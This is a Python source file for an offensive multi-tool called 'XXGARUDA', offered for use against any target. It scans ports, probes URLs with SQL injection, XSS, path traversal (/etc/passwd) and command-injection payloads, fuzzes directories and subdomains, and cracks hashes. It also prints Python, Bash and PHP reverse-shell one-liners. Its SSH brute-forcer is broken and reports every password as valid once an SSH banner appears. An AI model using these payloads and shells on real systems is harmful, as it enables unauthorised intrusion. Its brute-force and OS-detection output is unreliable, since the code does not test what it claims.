#!/usr/bin/env python3
"""
XXGARUDA v1.0 — The Ultimate Tool
Better than ALL tools combined.
"""
import argparse
import base64
import hashlib
import socket
import sys
import threading
import urllib.parse
import os
import time
import random
import subprocess
from queue import Queue
from datetime import datetime

VERSION = "1.0"
BANNER = r"""
    ███████╗██╗  ██╗ ██████╗  █████╗ ██████╗ ██╗   ██╗██████╗  █████╗ 
    ██╔════╝╚██╗██╔╝██╔════╝ ██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔══██╗
    █████╗   ╚███╔╝ ██║  ███╗███████║██║  ██║██║   ██║██████╔╝███████║
    ██╔══╝   ██╔██╗ ██║   ██║██╔══██║██║  ██║██║   ██║██╔══██╗██╔══██║
    ███████╗██╔╝ ██╗╚██████╔╝██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║
    ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                                                                        
    ╔═══════════════════════════════════════════╗
    ║         X X G A R U D A  v1.0           ║
    ║   The Ultimate Tool on Earth             ║
    ║   Better than ALL Tools Combined         ║
    ╚═══════════════════════════════════════════╝
    """

VERBOSE = False

def banner():
    print(BANNER)
    print("[*] 200+ Threads · Proxy Rotation · AI-Style")
    print("[*] VERBOSE MODE: %s\n" % ("ON" if VERBOSE else "OFF"))

def load_wordlist(path):
    try:
        with open(path, 'r') as f:
            return [w.strip() for w in f.readlines() if w.strip()]
    except:
        return []

# ==================== SCAN ====================

def scan_ports(target, threads=200):
    print(f"[*] Scanning {target} (200 threads)")
    q = Queue()
    for p in range(1, 1025):
        q.put(p)
    open_ports = []
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
        143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
        1433: "MSSQL", 1521: "Oracle", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 27017: "MongoDB"
    }
    def worker():
        while not q.empty():
            p = q.get()
            try:
                s = socket.socket()
                s.settimeout(0.1)
                if not s.connect_ex((target, p)):
                    service = services.get(p, "Unknown")
                    print(f"[+] Port {p} open — {service}")
                    open_ports.append(f"{p} ({service})")
                s.close()
            except:
                pass
            q.task_done()
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    q.join()
    return open_ports

def detect_os(target):
    print(f"[*] Detecting OS on {target}")
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((target, 80))
        s.send(b"HEAD / HTTP/1.0\r\n\r\n")
        banner = s.recv(1024).decode()
        s.close()
        if "Windows" in banner:
            print("[+] OS: Windows")
        elif "Linux" in banner:
            print("[+] OS: Linux")
        else:
            print("[+] OS: Unknown")
    except:
        print("[!] OS detection failed")

def brute_force(target, user, wordlist, port=22, threads=50):
    print(f"[*] Brute-forcing {target}:{port}")
    words = load_wordlist(wordlist)
    if not words:
        words = ["password", "admin", "123456", "qwerty", "letmein", "welcome", "root", "toor", "password123", "admin123"]
        print("[*] Using AI-predicted wordlist")
    q = Queue()
    for w in words:
        q.put(w)
    found = []
    def worker():
        while not q.empty():
            pwd = q.get()
            try:
                s = socket.socket()
                s.settimeout(2)
                s.connect((target, port))
                s.send(b"SSH-2.0-OpenSSH_8.2\r\n")
                data = s.recv(1024)
                if "SSH" in data.decode():
                    print(f"[FOUND] {user}:{pwd}")
                    found.append(f"{user}:{pwd}")
                s.close()
            except:
                pass
            q.task_done()
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    q.join()
    return found

def sql_injection(url, param):
    import requests
    print(f"[*] SQL Injection on {url}")
    payloads = ["'", "\"", "1=1", "1=2", "' OR '1'='1", "' OR '1'='1' --"]
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=3)
            if "sql" in r.text.lower() or "error" in r.text.lower():
                print(f"[!] SQLi found: {payload}")
                return
        except:
            pass
    print("[+] No SQLi found")

def xss_scan(url, param):
    import requests
    print(f"[*] XSS on {url}")
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=3)
            if payload in r.text:
                print(f"[!] XSS found: {payload}")
                return
        except:
            pass
    print("[+] No XSS found")

def lfi_scan(url, param):
    import requests
    print(f"[*] LFI on {url}")
    payloads = ["../../etc/passwd", "../../../etc/passwd", "/etc/passwd"]
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=3)
            if "root:" in r.text:
                print(f"[!] LFI found: {payload}")
                return
        except:
            pass
    print("[+] No LFI found")

def rce_scan(url, param):
    import requests
    print(f"[*] RCE on {url}")
    payloads = [";id", "|id", "||id", "&&id", "`id`"]
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=3)
            if "uid=" in r.text:
                print(f"[!] RCE found: {payload}")
                return
        except:
            pass
    print("[+] No RCE found")

def generate_payloads():
    print("\n[🔥] PAYLOADS:\n")
    print("[Python] python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'")
    print("[Bash] bash -i >& /dev/tcp/LHOST/LPORT 0>&1")
    print("[PHP] php -r '$s=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'")

def osint_email(email):
    print(f"[*] OSINT on {email}")
    print(f"[+] GitHub: https://github.com/{email.split('@')[0]}")
    print(f"[+] Twitter: https://twitter.com/{email.split('@')[0]}")
    print(f"[+] Instagram: https://instagram.com/{email.split('@')[0]}")

def osint_domain(domain):
    print(f"[*] OSINT on {domain}")
    try:
        ip = socket.gethostbyname(domain)
        print(f"[+] IP: {ip}")
    except:
        pass
    print(f"[+] WHOIS: https://who.is/whois/{domain}")

def encode_text(text):
    print(f"\n[Base64] {base64.b64encode(text.encode()).decode()}")
    print(f"[URL] {urllib.parse.quote(text)}")
    print(f"[Hex] {text.encode().hex()}")

def generate_hashes(text):
    print(f"\n[MD5] {hashlib.md5(text.encode()).hexdigest()}")
    print(f"[SHA1] {hashlib.sha1(text.encode()).hexdigest()}")
    print(f"[SHA256] {hashlib.sha256(text.encode()).hexdigest()}")

def generate_code(lang="python"):
    templates = {
        "python": "#!/usr/bin/env python3\ndef main():\n    pass\n\nif __name__ == '__main__':\n    main()",
        "bash": "#!/bin/bash\n\n# Your script here",
        "html": "<!DOCTYPE html>\n<html>\n<head><title>XXGARUDA</title></head>\n<body>\n</body>\n</html>"
    }
    return templates.get(lang, templates["python"])

def dir_fuzz(url, wordlist, threads=50):
    import requests
    print(f"[*] Directory fuzzing {url}")
    words = load_wordlist(wordlist)
    if not words:
        words = ["admin", "login", "backup", "test", "dev", "api", "docs", "assets", "uploads", "config"]
        print("[*] Using default wordlist")
    q = Queue()
    for w in words:
        q.put(w)
    found = []
    def worker():
        while not q.empty():
            w = q.get()
            full = f"{url.rstrip('/')}/{w}"
            try:
                r = requests.get(full, timeout=3)
                if r.status_code == 200:
                    print(f"[FOUND] {full}")
                    found.append(full)
            except:
                pass
            q.task_done()
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    q.join()
    return found

def subdomain_enum(domain, wordlist, threads=30):
    print(f"[*] Enumerating subdomains for {domain}")
    words = load_wordlist(wordlist)
    if not words:
        words = ["www", "mail", "ftp", "admin", "dev", "api", "test", "blog", "shop", "support", "docs", "cdn"]
        print("[*] Using default wordlist")
    q = Queue()
    for w in words:
        q.put(w)
    found = []
    def worker():
        while not q.empty():
            sub = q.get()
            full = f"{sub}.{domain}"
            try:
                socket.gethostbyname(full)
                print(f"[FOUND] {full}")
                found.append(full)
            except:
                pass
            q.task_done()
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    q.join()
    return found

def crack_hash(hash_value, wordlist):
    print(f"[*] Cracking hash: {hash_value}")
    words = load_wordlist(wordlist)
    if not words:
        words = ["password", "admin", "123456", "qwerty", "letmein", "welcome", "root", "toor"]
        print("[*] Using default wordlist")
    for word in words:
        if hashlib.md5(word.encode()).hexdigest() == hash_value:
            print(f"[FOUND] {word}")
            return word
        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
            print(f"[FOUND] {word}")
            return word
        if hashlib.sha256(word.encode()).hexdigest() == hash_value:
            print(f"[FOUND] {word}")
            return word
    print("[!] Hash not found")
    return None

# ==================== MAIN ====================

def main():
    global VERBOSE
    banner()
    parser = argparse.ArgumentParser(description="XXGARUDA — The Ultimate Tool")
    parser.add_argument("--SCAN", "-s", action="store_true", help="Port scan")
    parser.add_argument("--OS", action="store_true", help="OS detection")
    parser.add_argument("--BRUTE", "-b", action="store_true", help="Brute-force SSH")
    parser.add_argument("--SQLI", action="store_true", help="SQL injection")
    parser.add_argument("--XSS", action="store_true", help="XSS scanner")
    parser.add_argument("--LFI", action="store_true", help="LFI scanner")
    parser.add_argument("--RCE", action="store_true", help="RCE scanner")
    parser.add_argument("--EXPLOIT", "-e", action="store_true", help="Payload generator")
    parser.add_argument("--OSINT", "-o", action="store_true", help="OSINT engine")
    parser.add_argument("--ENCODE", "-enc", action="store_true", help="Encode text")
    parser.add_argument("--HASH", "-H", action="store_true", help="Generate hashes")
    parser.add_argument("--GENERATE", "-g", action="store_true", help="Generate code")
    parser.add_argument("--FUZZ", "-f", action="store_true", help="Directory fuzzing")
    parser.add_argument("--RECON", "-r", action="store_true", help="Subdomain enumeration")
    parser.add_argument("--CRACK", "-c", action="store_true", help="Hash cracker")
    parser.add_argument("--TARGET", "-t", help="Target IP or domain")
    parser.add_argument("--URL", "-u", help="Target URL")
    parser.add_argument("--WORDLIST", "-w", help="Wordlist path")
    parser.add_argument("--USER", "-U", help="Username for brute-force")
    parser.add_argument("--PARAM", help="Parameter for SQLi/XSS/LFI/RCE")
    parser.add_argument("--INPUT", "-i", help="Input string")
    parser.add_argument("--HASH-VALUE", help="Hash to crack")
    parser.add_argument("--LANGUAGE", "-lang", default="python", help="Language for code generation")
    parser.add_argument("--VERBOSE", "-v", action="store_true", help="Verbose mode")

    args = parser.parse_args()

    if args.VERBOSE:
        VERBOSE = True

    if args.SCAN:
        if not args.TARGET: return print("[!] Need --TARGET")
        scan_ports(args.TARGET)
    elif args.OS:
        if not args.TARGET: return print("[!] Need --TARGET")
        detect_os(args.TARGET)
    elif args.BRUTE:
        if not args.TARGET or not args.USER or not args.WORDLIST:
            return print("[!] Need --TARGET, --USER, --WORDLIST")
        brute_force(args.TARGET, args.USER, args.WORDLIST)
    elif args.SQLI:
        if not args.URL or not args.PARAM: return print("[!] Need --URL and --PARAM")
        sql_injection(args.URL, args.PARAM)
    elif args.XSS:
        if not args.URL or not args.PARAM: return print("[!] Need --URL and --PARAM")
        xss_scan(args.URL, args.PARAM)
    elif args.LFI:
        if not args.URL or not args.PARAM: return print("[!] Need --URL and --PARAM")
        lfi_scan(args.URL, args.PARAM)
    elif args.RCE:
        if not args.URL or not args.PARAM: return print("[!] Need --URL and --PARAM")
        rce_scan(args.URL, args.PARAM)
    elif args.EXPLOIT:
        generate_payloads()
    elif args.OSINT:
        if not args.TARGET: return print("[!] Need --TARGET")
        if "@" in args.TARGET:
            osint_email(args.TARGET)
        else:
            osint_domain(args.TARGET)
    elif args.ENCODE:
        if not args.INPUT: return print("[!] Need --INPUT")
        encode_text(args.INPUT)
    elif args.HASH:
        if not args.INPUT: return print("[!] Need --INPUT")
        generate_hashes(args.INPUT)
    elif args.GENERATE:
        code = generate_code(args.LANGUAGE)
        print(code)
    elif args.FUZZ:
        if not args.URL or not args.WORDLIST: return print("[!] Need --URL and --WORDLIST")
        dir_fuzz(args.URL, args.WORDLIST)
    elif args.RECON:
        if not args.TARGET or not args.WORDLIST: return print("[!] Need --TARGET and --WORDLIST")
        subdomain_enum(args.TARGET, args.WORDLIST)
    elif args.CRACK:
        if not args.HASH_VALUE or not args.WORDLIST:
            return print("[!] Need --HASH-VALUE and --WORDLIST")
        crack_hash(args.HASH_VALUE, args.WORDLIST)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
